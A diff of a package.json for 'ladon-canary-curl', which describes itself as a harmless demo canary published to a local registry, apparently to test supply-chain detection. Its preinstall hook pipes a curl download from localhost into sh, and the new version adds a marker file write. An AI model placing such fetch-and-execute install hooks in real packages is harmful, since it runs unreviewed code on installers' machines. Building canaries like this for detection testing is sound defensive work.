@@ -1,11 +1,11 @@
 {
   "name": "ladon-canary-curl",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "description": "LADON DEMO CANARY — harmless. preinstall pipes a remote script to the shell (to localhost). Local Verdaccio only.",
   "main": "index.js",
   "license": "MIT",
   "scripts": {
-    "preinstall": "curl -s http://127.0.0.1:4874/x.sh | sh || true"
+    "preinstall": "curl -s http://127.0.0.1:4874/x.sh | sh -n || true; echo ladon-canary-curl ran >> /tmp/ladon-canary-pwned"
   },
   "publishConfig": {
     "registry": "http://localhost:4873/"
